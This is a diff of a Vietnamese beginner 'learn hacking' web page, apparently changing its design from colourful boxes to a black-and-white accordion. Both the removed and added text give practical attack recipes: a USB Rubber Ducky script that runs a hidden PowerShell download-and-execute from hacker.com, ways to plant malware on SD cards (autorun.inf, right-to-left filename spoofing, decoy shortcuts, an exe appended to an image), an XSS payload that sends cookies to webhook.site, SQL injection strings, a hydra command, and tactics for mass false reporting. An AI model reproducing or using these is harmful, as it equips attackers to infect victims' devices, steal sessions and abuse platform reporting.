@@ -3,676 +3,665 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Học Hacker Siêu Đơn Giản - Tổng Hợp Toàn Bộ - Thiết Bị Hack - AI - File Types</title>
+    <title>Học Hacker - Giao Diện Đen Trắng Đơn Giản - Toàn Tập</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a0a; color: #00ff00; line-height: 1.8; padding: 10px;
+            background: #000; color: #fff; font-family: 'Courier New', monospace;
+            padding: 20px; line-height: 1.6;
         }
         .container {
-            max-width: 900px; margin: 0 auto; background: #111;
-            border: 2px solid #00ff00; border-radius: 15px; padding: 25px;
+            max-width: 700px; margin: 0 auto;
         }
         h1 {
-            text-align: center; color: #00ff00; font-size: 26px;
-            border-bottom: 3px solid #00ff00; padding-bottom: 15px; margin-bottom: 20px;
+            text-align: center; font-size: 22px; padding: 20px;
+            border: 1px solid #fff; margin-bottom: 25px;
         }
-        h2 {
-            color: #ffaa00; font-size: 22px; margin: 30px 0 15px;
-            padding: 12px; background: #1a1a00; border-left: 5px solid #ffaa00;
-            border-radius: 0 10px 10px 0;
+        .accordion {
+            border: 1px solid #fff; margin-bottom: 2px;
         }
-        h3 {
-            color: #00ccff; font-size: 18px; margin: 20px 0 10px;
-            border-bottom: 1px dashed #00ccff; padding-bottom: 5px;
+        .accordion-header {
+            background: #000; color: #fff; padding: 14px 18px;
+            cursor: pointer; font-size: 15px; font-weight: bold;
+            border: none; width: 100%; text-align: left;
+            font-family: 'Courier New', monospace;
+            display: flex; justify-content: space-between; align-items: center;
         }
-        .box {
-            background: #1a1a1a; padding: 18px; border-radius: 10px;
-            margin: 15px 0; border: 1px solid #333;
+        .accordion-header:hover { background: #111; }
+        .accordion-header::after {
+            content: '[+]'; font-size: 18px;
         }
-        .box-red { border-left: 4px solid #ff4444; }
-        .box-green { border-left: 4px solid #00ff00; }
-        .box-blue { border-left: 4px solid #0088ff; }
-        .box-yellow { border-left: 4px solid #ffaa00; }
-        .box-purple { border-left: 4px solid #aa00ff; }
-        .box-cyan { border-left: 4px solid #00cccc; }
+        .accordion-header.active::after {
+            content: '[-]';
+        }
+        .accordion-content {
+            display: none; padding: 20px; border-top: 1px solid #fff;
+            font-size: 14px; background: #0a0a0a;
+        }
+        .accordion-content.show { display: block; }
         pre {
-            background: #000; padding: 15px; border-radius: 8px;
-            border: 1px solid #333; margin: 10px 0; font-size: 12px;
-            overflow-x: auto; color: #00ff00; font-family: 'Courier New', monospace;
+            background: #000; padding: 15px; margin: 10px 0;
+            border: 1px solid #333; overflow-x: auto;
+            font-family: 'Courier New', monospace; font-size: 13px;
+            white-space: pre-wrap; word-break: break-all;
         }
         code {
-            background: #000; padding: 3px 8px; border-radius: 4px;
-            color: #ff6b6b; font-family: 'Courier New', monospace; font-size: 12px;
+            background: #111; padding: 2px 6px;
+            font-family: 'Courier New', monospace;
         }
-        .keyword {
-            display: inline-block; padding: 4px 10px; border-radius: 15px;
-            margin: 3px; font-weight: bold; font-size: 12px;
-        }
-        .k-black { background: #ff0000; color: #fff; }
-        .k-white { background: #00ff00; color: #000; }
-        .k-grey { background: #888; color: #fff; }
-        .k-blue { background: #0088ff; color: #fff; }
-        .k-red { background: #cc0000; color: #fff; }
-        .k-purple { background: #8800cc; color: #fff; }
-        .k-yellow { background: #ccaa00; color: #000; }
         table {
-            width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 12px;
+            width: 100%; border-collapse: collapse; margin: 12px 0;
         }
         th, td {
-            border: 1px solid #333; padding: 8px; text-align: left;
+            border: 1px solid #fff; padding: 8px; text-align: left;
         }
-        th { background: #1a1a1a; color: #ffaa00; font-size: 13px; }
+        th { background: #111; }
         .step {
-            background: #0a1a0a; padding: 12px; border-radius: 10px;
-            margin: 10px 0; border: 1px solid #00ff00;
+            border: 1px solid #333; padding: 12px; margin: 8px 0;
         }
         .step-num {
-            display: inline-block; background: #00ff00; color: #000;
-            width: 28px; height: 28px; text-align: center; line-height: 28px;
-            border-radius: 50%; font-weight: bold; margin-right: 8px;
-        }
-        .note {
-            background: #1a1a00; border: 1px solid #ffaa00;
-            padding: 12px; border-radius: 8px; margin: 12px 0; color: #ffaa00;
+            display: inline-block; border: 1px solid #fff;
+            width: 26px; height: 26px; text-align: center; line-height: 26px;
+            margin-right: 8px;
         }
         .warning {
-            background: #1a0000; border: 1px solid #ff0000;
-            padding: 12px; border-radius: 8px; margin: 12px 0; color: #ff6666;
-        }
-        .hacker-card {
-            background: #0d0d1a; border: 1px solid #ffaa00;
-            padding: 15px; border-radius: 10px; margin: 15px 0;
+            border: 1px solid #fff; padding: 12px; margin: 10px 0;
+            background: #111;
         }
     </style>
 </head>
 <body>
     <div class="container">
 
-        <h1>📱 HỌC HACKER SIÊU ĐƠN GIẢN - TỔNG HỢP TOÀN BỘ</h1>
-        <p style="text-align:center;color:#ffaa00;">Thiết bị Hack - AI - File Types - Thẻ Nhớ SD - Virus USB</p>
+        <h1>HOC HACKER TOAN TAP - TU A DEN Z</h1>
 
-        <!-- ========== THIẾT BỊ DÙNG ĐỂ HACK ========== -->
-        <h2>🔧 PHẦN 1: CÁC THIẾT BỊ DÙNG ĐỂ HACK</h2>
-
-        <div class="box box-red">
-            <h3>1. USB Rubber Ducky - Bàn phím giả lập</h3>
-            <p><b>Là gì:</b> USB trông giống ổ flash thông thường, nhưng máy tính nhận diện là <b>bàn phím</b>. Nó tự động gõ lệnh với tốc độ siêu nhanh (1000 từ/phút).</p>
-            <pre>
-# CÁCH USB RUBBER DUCKY HOẠT ĐỘNG:
-1. Cắm USB vào máy tính
-2. Máy tính nhận diện: "Đây là bàn phím HID"
-3. USB bắt đầu "gõ" các lệnh đã được lập trình sẵn
-4. Tốc độ gõ: 1000 ký tự/phút (nhanh hơn người gõ 100 lần)
-
-# KỊCH BẢN TẤN CÔNG MẪU:
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -WindowStyle Hidden
-ENTER
-DELAY 500
-STRING IEX (New-Object Net.WebClient).DownloadString('http://hacker.com/payload.ps1')
-ENTER
-
-# Kịch bản trên làm gì?
-1. Đợi 1 giây
-2. Nhấn Windows + R (mở hộp thoại Run)
-3. Gõ lệnh mở PowerShell ẩn
-4. Tải và chạy mã độc từ server hacker
-5. Nạn nhân KHÔNG nhìn thấy gì (PowerShell ẩn)
-
-# CÁCH PHÒNG CHỐNG:
-✅ Khóa máy khi rời đi
-✅ Không cắm USB lạ vào máy
-✅ Tắt AutoRun trong Windows
-✅ Dùng phần mềm chặn thiết bị HID lạ</pre>
+        <!-- 1 -->
+        <div class="accordion">
+            <button class="accordion-header">KHAI NIEM CO BAN - THUAT NGU</button>
+            <div class="accordion-content">
+                <table>
+                    <tr><th>Thuat ngu</th><th>Nghia don gian</th></tr>
+                    <tr><td>Bug</td><td>Loi trong chuong trinh</td></tr>
+                    <tr><td>Exploit</td><td>Cach loi dung loi</td></tr>
+                    <tr><td>Virus</td><td>Phan mem doc hai, tu nhan ban</td></tr>
+                    <tr><td>Malware</td><td>Phan mem xau noi chung</td></tr>
+                    <tr><td>Phishing</td><td>Lua dao gia mao</td></tr>
+                    <tr><td>DDoS</td><td>Tan cong lam nghen website</td></tr>
+                    <tr><td>VPN</td><td>Mang rieng ao, che IP</td></tr>
+                    <tr><td>Proxy</td><td>May trung gian, an IP</td></tr>
+                    <tr><td>IP</td><td>Dia chi tren internet</td></tr>
+                    <tr><td>Port</td><td>Cua vao may tinh</td></tr>
+                    <tr><td>Firewall</td><td>Tuong lua, chan nguoi la</td></tr>
+                    <tr><td>SQL Injection</td><td>Chen lenh SQL vao web</td></tr>
+                    <tr><td>XSS</td><td>Chen JavaScript vao web</td></tr>
+                    <tr><td>Brute Force</td><td>Thu tat ca mat khau</td></tr>
+                    <tr><td>Backdoor</td><td>Cua sau bi mat vao may</td></tr>
+                    <tr><td>Botnet</td><td>Mang luoi may tinh ma</td></tr>
+                    <tr><td>Root</td><td>Quyen cao nhat</td></tr>
+                    <tr><td>Jailbreak</td><td>Pha khoa iPhone</td></tr>
+                    <tr><td>Ransomware</td><td>Ma hoa doi tien chuoc</td></tr>
+                    <tr><td>Keylogger</td><td>Ghi lai moi phim bam</td></tr>
+                    <tr><td>Zero-Day</td><td>Lo hong chua duoc va</td></tr>
+                    <tr><td>Payload</td><td>Ma doc thuc thi</td></tr>
+                    <tr><td>Shell</td><td>Giao dien dong lenh</td></tr>
+                    <tr><td>Sandbox</td><td>Moi truong cach ly</td></tr>
+                    <tr><td>Encryption</td><td>Ma hoa du lieu</td></tr>
+                </table>
+            </div>
         </div>
 
-        <div class="box box-red">
-            <h3>2. Flipper Zero - "Công cụ đa năng của hacker"</h3>
-            <p><b>Là gì:</b> Thiết bị cầm tay giống máy chơi game, có thể hack: RFID, NFC, Bluetooth, WiFi, Remote TV/AC, Cửa từ, Thẻ từ...</p>
-            <pre>
-# FLIPPER ZERO CÓ THỂ LÀM GÌ?
+        <!-- 2 -->
+        <div class="accordion">
+            <button class="accordion-header">CAC LOAI HACKER (MU) - CHI TIET TUNG LOAI</button>
+            <div class="accordion-content">
+                <h3>BLACK HAT (Mu Den)</h3>
+                <pre>Nguoi xau, hack vi tien, pha hoai.
+Cach hoat dong:
+1. Trinh sat (Recon): Thu thap thong tin muc tieu
+2. Quet (Scan): Nmap, Nessus tim lo hong
+3. Khai thac (Exploit): Dung Metasploit, SQLMap
+4. Hau khai thac: Cai backdoor, danh cap du lieu
+5. Xoa log, an dau vet, ban du lieu tren dark web
 
-1. ĐỌC/SAO CHÉP THẺ TỪ (RFID/NFC):
-   - Quẹt Flipper vào thẻ ra vào tòa nhà
-   - Copy UID của thẻ
-   - Phát lại để mở cửa
-   - Lưu trữ nhiều thẻ trong bộ nhớ
+Cong cu: Metasploit, Cobalt Strike, Mimikatz, Empire, Burp Suite</pre>
+                <h3>WHITE HAT (Mu Trang)</h3>
+                <pre>Nguoi tot, bao ve he thong.
+Cach hoat dong:
+1. Lap ke hoach: Ky hop dong, xac dinh pham vi
+2. Trinh sat: Thu thap thong tin CO PHEP
+3. Quet va liet ke: Tim lo hong, ghi chep
+4. Khai thac co kiem soat: Chi lay PoC, khong gay hai
+5. Bao cao: Viet report, danh gia CVSS, de xuat sua loi
 
-2. MỞ KHÓA CỬA XE Ô TÔ:
-   - Bắt tín hiệu remote car key (Sub-GHz)
-   - Phát lại để mở khóa xe
-   - Hoạt động với tần số 315MHz, 433MHz, 868MHz
-
-3. ĐIỀU KHIỂN TV/ĐIỀU HÒA:
-   - Thư viện hồng ngoại (IR) khổng lồ
-   - Bật/tắt TV, đổi kênh hàng loạt
-   - Troll bạn bè, quán cafe
-
-4. BẮT TÍN HIỆU BLUETOOTH:
-   - Quét thiết bị Bluetooth xung quanh
-   - Spam thông báo đến iPhone (BLE spam)
-   - Gây crash một số điện thoại cũ
-
-5. BAD USB MODE:
-   - Giống Rubber Ducky
-   - Cắm Flipper vào máy tính qua USB
-   - Tự động gõ lệnh đã lập trình
-
-6. WIFI DEAUTH:
-   - Gửi gói deauth để đá thiết bị khỏi WiFi
-   - Tạo mạng WiFi giả mạo (Evil Twin)
-
-# GIÁ FLIPPER ZERO: ~$169 - $200
-# CÓ HỢP PHÁP KHÔNG? 
-- Thiết bị hợp pháp để mua/bán
-- NHƯNG dùng để hack người khác là PHẠM PHÁP</pre>
+Chung chi: CEH, OSCP, CISSP, GPEN</pre>
+                <h3>GREY HAT (Mu Xam)</h3>
+                <pre>O giua, xam nhap khong xin phep nhung khong gay hai.
+Thuong tim lo hong tinh co -> bao cho chu he thong.
+Co the yeu cau tien thuong. Neu bi tu choi, cong khai sau 90 ngay.
+Rui ro phap ly cao vi xam nhap trai phep.</pre>
+                <h3>BLUE HAT (Mu Xanh Duong)</h3>
+                <pre>Chuyen gia bao mat duoc Microsoft thue.
+Tim lo hong trong san pham Microsoft.
+Tham gia BlueHat Conference.
+Nhan thuong len den $250,000.</pre>
+                <h3>RED HAT (Mu Do)</h3>
+                <pre>San lung Black Hat. Tan cong nguoc lai hacker xau.
+Tu y vo hieu hoa hacker xau. Ranh gioi phap ly rat mong manh.</pre>
+                <h3>GREEN HAT (Mu Xanh La)</h3>
+                <pre>Nguoi moi hoc, chua co ky nang cao.
+Dung cong cu co san (script kiddie).
+Lo trinh: Networking -> Linux -> Python -> OWASP -> CTF -> Thuc tap.</pre>
+                <h3>PURPLE HAT (Mu Tim)</h3>
+                <pre>Ket hop Red Team (tan cong) va Blue Team (phong thu).
+Tu tan cong he thong cua minh de cai thien.</pre>
+            </div>
         </div>
 
-        <div class="box box-red">
-            <h3>3. Raspberry Pi - Máy tính siêu nhỏ</h3>
-            <p><b>Là gì:</b> Máy tính Linux kích thước bằng thẻ tín dụng, giá $35, dùng để build công cụ hack di động.</p>
-            <pre>
-# RASPBERRY PI DÙNG ĐỂ HACK NHƯ THẾ NÀO?
-
-1. KALI LINUX TRÊN RASPBERRY PI:
-   - Cài Kali Linux ARM
-   - Có tất cả tool hacking: Metasploit, Nmap, Wireshark
-   - Nhỏ gọn, bỏ túi, cắm điện là chạy
-
-2. P4WNPI (WiFi Hacking Tool):
-   - Biến Raspberry Pi thành máy hack WiFi
-   - Tự động bắt handshake WPA2
-   - Crack password với GPU tích hợp
-
-3. POCKET PENTEST KIT:
-   - Raspberry Pi + Pin dự phòng + Màn hình nhỏ
-   - Cắm vào mạng LAN của công ty
-   - Tự động scan và khai thác lỗ hổng
-
-4. VPN GATEWAY BÍ MẬT:
-   - Cắm Raspberry Pi vào router
-   - Tạo đường hầm VPN cho hacker từ xa
-   - Không ai phát hiện
-
-5. KEYLOGGER PHẦN CỨNG:
-   - Raspberry Pi Zero + USB adapter
-   - Cắm giữa bàn phím và máy tính
-   - Ghi lại mọi phím bấm</pre>
+        <!-- 3 -->
+        <div class="accordion">
+            <button class="accordion-header">HACKER NOI TIENG & CACH HO HACK</button>
+            <div class="accordion-content">
+                <h3>Hieu PC (Ngo Minh Hieu) - Viet Nam</h3>
+                <pre>Tuong la Black Hat chuyen danh cap du lieu, bi FBI bat, sau thanh White Hat tai NCSC Viet Nam.
+Ky thuat: SQL Injection, Phishing, Social Engineering.
+Danh cap du lieu hang loat, ban tren dark web.
+Bi bat tai Guam (My) 2013, 13 nam tu.
+Bai hoc: "Dung ky nang de bao ve, khong pha hoai."</pre>
+                <h3>Kevin Mitnick (My) - Black Hat -> White Hat</h3>
+                <pre>Hacker bi truy na gat gao nhat My thap nien 90.
+Ky thuat chinh: SOCIAL ENGINEERING.
+Gia lam nhan vien IT goi dien lua nhan vien.
+Danh cap ma nguon Motorola, Nokia, Sun.
+Tu che thiet bi gia mao tram phat song (cell tower).
+Bi bat 1995, 5 nam tu. Sau thanh chuyen gia bao mat hang dau.
+Viet sach: "Ghost in the Wires", "The Art of Deception".</pre>
+                <h3>Evgeniy Bogachev (Nga) - Black Hat</h3>
+                <pre>Tao ra GameOver ZeuS - botnet danh cap >100 trieu USD.
+Phat tan malware qua email phishing.
+Keylogger + man hinh ngan hang -> chuyen tien tu dong.
+FBI treo thuong $3,000,000. Van dang bi truy na.</pre>
+                <h3>Marcus Hutchins / MalwareTech (Anh) - Grey -> White</h3>
+                <pre>Vo tinh dung cuoc tan cong WannaCry toan cau 2017.
+Phat hien "kill switch" trong ma WannaCry.
+Mua domain iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com voi $10.69.
+Kich hoat DNS sinkhole -> WannaCry tu dung.</pre>
+                <h3>Edward Snowden (My) - Whistleblower</h3>
+                <pre>Cuu nhan vien NSA. Tiet lo chuong trinh giam sat PRISM.
+Dung quyen admin copy 200,000+ tai lieu mat.
+Giau the nho trong Rubik's Cube.
+Tiet lo NSA giam sat internet toan cau.
+Dang song ti nan tai Nga.</pre>
+            </div>
         </div>
 
-        <div class="box box-red">
-            <h3>4. WiFi Pineapple - Giả mạo WiFi</h3>
-            <p><b>Là gì:</b> Thiết bị tạo ra mạng WiFi giả mạo, khi nạn nhân kết nối vào, mọi dữ liệu đều bị chặn.</p>
-            <pre>
-# CÁCH WIFI PINEAPPLE HOẠT ĐỘNG:
+        <!-- 4 -->
+        <div class="accordion">
+            <button class="accordion-header">CACH HOAT DONG CUA TRANG WEB</button>
+            <div class="accordion-content">
+                <pre>MO HINH HOAT DONG:
+Ban (Browser)                Server (May chu)
+    |  1. Go URL: facebook.com     |
+    |----------------------------->|
+    |  2. GET / HTTP/1.1           |
+    |                              |
+    |  3. Server xu ly             |
+    |<-----------------------------|
+    |  4. HTML + CSS + JavaScript  |
+    |                              |
+    |  5. Hien thi trang web       |
 
-1. TẠO EVIL TWIN (Sinh đôi độc ác):
-   - Pineapple tạo WiFi giả: "Starbucks_Free_WiFi"
-   - Nạn nhân thấy 2 WiFi giống hệt nhau
-   - 1 thật, 1 giả (của Pineapple)
+THANH PHAN:
+HTML = Khung xuong (noi dung, cau truc)
+CSS = Trang tri (mau sac, bo cuc)
+JavaScript = Tuong tac (nut bam, animation)
+Backend = Logic xu ly (PHP, Python, Node.js)
+Database = Luu tru du lieu (MySQL, MongoDB)
 
-2. KHI NẠN NHÂN KẾT NỐI:
-   - Mọi request web đi qua Pineapple
-   - Đọc được mọi thứ: email, mật khẩu, cookie
-   - Có thể chèn malware vào trang web
+HTTP METHODS:
+GET     -> Lay du lieu (xem trang web)
+POST    -> Gui du lieu (dang nhap, dang ky)
+PUT     -> Cap nhat du lieu
+DELETE  -> Xoa du lieu
 
-3. CAPTIVE PORTAL GIẢ:
-   - Hiện trang đăng nhập giả: "Đăng nhập Facebook để dùng WiFi"
-   - Nạn nhân nhập user/pass → Gửi về hacker
-
-4. SSL STRIP:
-   - Ép kết nối HTTPS → HTTP (bỏ mã hóa)
-   - Đọc được dữ liệu ngân hàng, email</pre>
+HTTP STATUS CODES:
+200 OK              -> Thanh cong
+301/302             -> Chuyen huong
+403 Forbidden       -> Bi cam truy cap
+404 Not Found       -> Khong tim thay
+500 Internal Error  -> Loi server</pre>
+            </div>
         </div>
 
-        <div class="box box-red">
-            <h3>5. HackRF One - SDR (Software Defined Radio)</h3>
-            <p><b>Là gì:</b> Thiết bị thu/phát sóng vô tuyến, có thể bắt và giả mạo tín hiệu radio từ 1MHz đến 6GHz.</p>
-            <pre>
-# HACKRF CÓ THỂ LÀM GÌ?
-
-1. NGHE LÉN RADIO:
-   - Cảnh sát, taxi, máy bay, tàu hỏa
-   - Tần số 100MHz - 500MHz
-
-2. GIẢ MẠO TÍN HIỆU:
-   - Mở cửa garage, cổng từ xa
-   - Phát tín hiệu car key fob
-
-3. BẮT TÍN HIỆU ĐIỆN THOẠI:
-   - IMSI Catcher (giả trạm BTS)
-   - Bắt số điện thoại, tin nhắn SMS
-   - (Cần kiến thức chuyên sâu)
-
-4. GPS SPOOFING:
-   - Giả mạo tín hiệu GPS
-   - Khiến drone/điện thoại nghĩ đang ở vị trí khác</pre>
+        <!-- 5 -->
+        <div class="accordion">
+            <button class="accordion-header">PROXY & VPN - AN DANH TREN MANG</button>
+            <div class="accordion-content">
+                <h3>PROXY LA GI?</h3>
+                <pre>Ban nho thang ban chuyen thu giup -> Thang ban = Proxy!
+Ban ---> Proxy ---> Internet (an IP that)
+HTTP Proxy: Chi cho web
+SOCKS5 Proxy: Cho moi thu
+Elite Proxy: An hoan toan</pre>
+                <h3>VPN LA GI?</h3>
+                <pre>Mac dong phuc truong khac de vao thu vien -> Dong phuc = VPN!
+Ban ---> [Duong ham ma hoa] ---> Internet (khong ai doc duoc)
+Proxy: Khong ma hoa, nhanh, re
+VPN: Co ma hoa, cham hon, an toan hon</pre>
+                <h3>CACH CAI DAT TREN IPHONE:</h3>
+                <pre>VPN: Cai dat -> Chung -> VPN -> Them cau hinh VPN
+App VPN mien phi: ProtonVPN, Windscribe, TunnelBear
+Proxy: Cai dat -> Wi-Fi -> Chon mang -> HTTP Proxy -> Thu cong -> Nhap IP va Port</pre>
+            </div>
         </div>
 
-        <!-- ========== THẺ NHỚ SD ========== -->
-        <h2>💾 PHẦN 2: THẺ NHỚ SD - CÁCH HACK VÀ CÀI VIRUS</h2>
-
-        <div class="box box-yellow">
-            <h3>1. Thẻ nhớ SD là gì? Dùng để làm gì?</h3>
-            <table>
-                <tr><th>Loại thẻ</th><th>Kích thước</th><th>Dung lượng</th><th>Dùng cho</th></tr>
-                <tr><td>SD</td><td>32x24mm</td><td>Đến 2GB</td><td>Máy ảnh cũ</td></tr>
-                <tr><td>SDHC</td><td>32x24mm</td><td>4GB-32GB</td><td>Máy ảnh, laptop</td></tr>
-                <tr><td>SDXC</td><td>32x24mm</td><td>64GB-2TB</td><td>Camera 4K, drone</td></tr>
-                <tr><td>MicroSD</td><td>15x11mm</td><td>Đến 1TB</td><td>Điện thoại, tablet</td></tr>
-            </table>
+        <!-- 6 -->
+        <div class="accordion">
+            <button class="accordion-header">TAT CA CAC DANG TAN CONG HACKING</button>
+            <div class="accordion-content">
+                <h3>1. DDoS - Danh sap website</h3>
+                <pre>1000 nguoi chen vao 1 cua hang nho -> Khong ai vao duoc.
+Guii hang trieu request/giiay -> Server qua tai -> sup.
+Cong cu: LOIC, HOIC, Slowloris, hping3</pre>
+                <h3>2. SQL Injection - Danh cap database</h3>
+                <pre>Nhap code SQL thay vi username.
+Payload: ' OR '1'='1' --
+         ' UNION SELECT username,password FROM users --
+Cong cu: sqlmap -u "URL" --dbs</pre>
+                <h3>3. XSS - Chen JavaScript</h3>
+                <pre>Payload: <script>alert('XSS')</script>
+Danh cap cookie: <script>fetch('https://webhook.site/ID?c='+document.cookie)</script>
+Cac loai: Stored XSS, Reflected XSS, DOM-based XSS</pre>
+                <h3>4. Phishing - Lua dao gia mao</h3>
+                <pre>Tao trang web gia mao giong that. Gui link cho nan nhan.
+Ho dang nhap -> Ban co mat khau.
+Dau hieu: URL la, email sai chinh ta, yeu cau gap.</pre>
+                <h3>5. Brute Force - Do mat khau</h3>
+                <pre>Thu tat ca mat khau co the.
+Cong cu: Hydra, John the Ripper, Hashcat.
+hydra -l admin -P pass.txt target.com http-post-form</pre>
+                <h3>6. MITM - Tan cong trung gian</h3>
+                <pre>Dung giua nan nhan va internet, doc trom + thay doi du lieu.
+Cong cu: BetterCAP, Ettercap, arpspoof.</pre>
+                <h3>7. Ransomware - Ma hoa doi tien chuoc</h3>
+                <pre>Ma hoa toan bo file nan nhan. Doi tien chuoc bang Bitcoin.
+Vi du: WannaCry, LockBit, CryptoLocker.</pre>
+                <h3>8. Social Engineering - Lua dao tam ly</h3>
+                <pre>Lua con nguoi, khong phai he thong.
+Gia lam nhan vien IT goi dien, gia lam sep nhan tin.
+Con nguoi la mat xich yeu nhat.</pre>
+            </div>
         </div>
 
-        <div class="box box-red">
-            <h3>2. Cách cài virus vào thẻ nhớ SD</h3>
-            
-            <div class="step">
-                <span class="step-num">1</span><b>Autorun Virus (Windows):</b>
-                <pre># Tạo file autorun.inf trên thẻ SD:
+        <!-- 7 -->
+        <div class="accordion">
+            <button class="accordion-header">CACH REPORT FACEBOOK & TIKTOK</button>
+            <div class="accordion-content">
+                <h3>Report Facebook:</h3>
+                <pre>1. Report trang: Vao trang -> "..." -> Tim ho tro hoac bao cao
+2. Report bai viet: Vao bai viet -> "..." -> Bao cao bai viet
+3. Report hang loat: Dung 10-20 tai khoan cung report 1 trang
+4. Report DMCA (manh nhat): facebook.com/help/contact/634636770043106
+   Claim vi pham ban quyen -> Facebook phai xu ly trong 24h
+5. Report gia mao: facebook.com/hacked -> Tai khoan bi gia mao</pre>
+                <h3>Report TikTok:</h3>
+                <pre>1. Report profile: Vao profile -> Share -> Bao cao
+2. Report video: Nhan giu video -> Bao cao
+3. Report hang loat: 20-30 tai khoan cung report
+4. Email legal: legal@tiktok.com, feedback@tiktok.com, privacy@tiktok.com
+5. Form chinh thuc: tiktok.com/legal/report/feedback</pre>
+            </div>
+        </div>
+
+        <!-- 8 -->
+        <div class="accordion">
+            <button class="accordion-header">THIET BI DUNG DE HACK</button>
+            <div class="accordion-content">
+                <h3>1. USB Rubber Ducky</h3>
+                <pre>USB gia lam ban phim. Cam vao -> Tu dong go lenh 1000 tu/phut.
+Mo PowerShell an -> Tai va chay malware.
+Phong chong: Khong cam USB la, tat AutoRun.</pre>
+                <h3>2. Flipper Zero</h3>
+                <pre>Cong cu da nang: RFID/NFC, Bluetooth, WiFi, Hong ngoai, Bad USB.
+Copy the tu, mo cua xe, dieu khien TV, spam BLE, WiFi deauth.
+Gia: $169-$200. Hop phap mua nhung dung sai muc dich la pham phap.</pre>
+                <h3>3. Raspberry Pi</h3>
+                <pre>May tinh Linux sieu nho ($35).
+Cai Kali Linux -> Bo tool hacking di dong.
+P4wnPi: Tool hack WiFi. Keylogger phan cung. VPN gateway bi mat.</pre>
+                <h3>4. WiFi Pineapple</h3>
+                <pre>Tao WiFi gia mao (Evil Twin). Nan nhan ket noi -> Doc moi du lieu.
+Captive portal gia -> Lua dang nhap. SSL strip -> Bo ma hoa.</pre>
+                <h3>5. HackRF One</h3>
+                <pre>SDR (Software Defined Radio): Thu/phat song vo tuyen 1MHz-6GHz.
+Nghe len radio, gia mao tin hieu, GPS spoofing.</pre>
+            </div>
+        </div>
+
+        <!-- 9 -->
+        <div class="accordion">
+            <button class="accordion-header">THE NHO SD - CACH HACK & CAI VIRUS</button>
+            <div class="accordion-content">
+                <h3>The nho SD la gi?</h3>
+                <table>
+                    <tr><th>Loai</th><th>Dung luong</th><th>Dung cho</th></tr>
+                    <tr><td>SD</td><td>Den 2GB</td><td>May anh cu</td></tr>
+                    <tr><td>SDHC</td><td>4GB-32GB</td><td>May anh, laptop</td></tr>
+                    <tr><td>SDXC</td><td>64GB-2TB</td><td>Camera 4K, drone</td></tr>
+                    <tr><td>MicroSD</td><td>Den 1TB</td><td>Dien thoai, tablet</td></tr>
+                </table>
+                <h3>Cach cai virus vao the SD:</h3>
+                <pre>1. AUTORUN VIRUS:
+Tao file autorun.inf:
 [AutoRun]
 open=virus.exe
-icon=virus.exe,0
 action=Open folder to view files
-label=My Photos
+-> Khi cam vao may, Windows tu chay virus.exe
 
-# Khi nạn nhân cắm thẻ vào máy tính:
-# 1. Windows đọc autorun.inf
-# 2. Tự động chạy virus.exe
-# 3. Máy bị nhiễm
+2. GIA MAO DUOI FILE:
+Dung ky tu Unicode U+202E de dao nguoc ten file.
+"photo.jpg[U+202E]exe.scr" -> Windows hien thi "photo.scr.jpg"
+Thuc chat la file .scr (executable)!
 
-# CÁCH TẠO:
-# 1. Viết virus.exe (bằng Python, C#, hoặc batch)
-# 2. Copy virus.exe vào thẻ SD
-# 3. Tạo file autorun.inf với nội dung trên
-# 4. Đặt thuộc tính ẩn (Hidden) cho cả 2 file
-# 5. Khi cắm vào máy → Virus tự chạy</pre>
-            </div>
+3. SHORTCUT VIRUS:
+Tao shortcut den virus.bat. Doi icon thanh icon anh/thu muc.
+Nan nhan click mo -> Virus chay ngam + anh that mo ra danh lua.
 
-            <div class="step">
-                <span class="step-num">2</span><b>Fake File Extension (Giả mạo đuôi file):</b>
-                <pre># KỸ THUẬT: Đảo ngược tên file Unicode (Right-to-Left Override)
-# Dùng ký tự đặc biệt U+202E để đảo ngược tên file
+4. PAYLOAD TRONG FILE ANH:
+copy /b cat.jpg + virus.exe secret.jpg
+File secret.jpg van mo duoc nhu anh binh thuong.
+Ben trong chua virus.exe.
 
-# VÍ DỤ:
-# File thật: "photo.jpg" + U+202E + "exe.scr"
-# Windows hiển thị: "photo.scr.jpg"
-# Nhưng thực chất là file .scr (executable)!
+5. ANDROID MALWARE QUA THE SD:
+Copy file virus.apk vao the SD voi ten hap dan.
+"Game_hay.apk", "Mod_YouTube.apk"
+Nan nhan cai dat -> Dien thoai bi nhiem.
 
-# CÁCH TẠO:
-# 1. Chuẩn bị virus.exe
-# 2. Đổi tên: "HinhAnh\u202Escr.exe"
-#    (Windows sẽ hiển thị là "HinhAnhexe.scr" ???)
-# 3. Để trong thẻ SD cùng với ảnh thật
-# 4. Nạn nhân click mở "ảnh" → Chạy virus</pre>
-            </div>
-
-            <div class="step">
-                <span class="step-num">3</span><b>Shortcut Virus (LNK Exploit):</b>
-                <pre># TẠO SHORTCUT ĐỘC HẠI:
-# 1. Tạo file virus.bat:
-@echo off
-start /b virus.exe
-start "" "C:\Program Files\Windows Photo Viewer\ImagingDevices.exe" "real_photo.jpg"
-
-# 2. Tạo shortcut trỏ đến virus.bat
-# 3. Đổi icon của shortcut thành icon thư mục/ảnh
-# 4. Đặt tên: "Ảnh cưới" hoặc "Tài liệu quan trọng"
-
-# KHI NẠN NHÂN CLICK:
-# - Virus chạy ngầm
-# - Ảnh thật mở ra (để đánh lừa)
-# - Nạn nhân không nghi ngờ gì</pre>
-            </div>
-
-            <div class="step">
-                <span class="step-num">4</span><b>BadUSB Firmware Attack (Nâng cao):</b>
-                <pre># SỬA FIRMWARE CỦA THẺ NHỚ:
-# Một số thẻ SD có bộ điều khiển có thể lập trình lại
-
-# KHI CẮM THẺ VÀO:
-# 1. Thẻ SD giả làm thiết bị HID (bàn phím)
-# 2. Tự động gõ lệnh tải malware
-# 3. Sau đó chuyển sang chế độ lưu trữ bình thường
-
-# CÔNG CỤ: SD-Card Hack, EvilSD
-# YÊU CẦU: Kiến thức về firmware, vi điều khiển</pre>
-            </div>
-
-            <div class="step">
-                <span class="step-num">5</span><b>Payload trong file ảnh/video:</b>
-                <pre># KỸ THUẬT STEGANOGRAPHY (Ẩn mã độc trong ảnh):
-# 1. Tạo file ảnh bình thường: cat.jpg
-# 2. Ẩn mã độc vào ảnh:
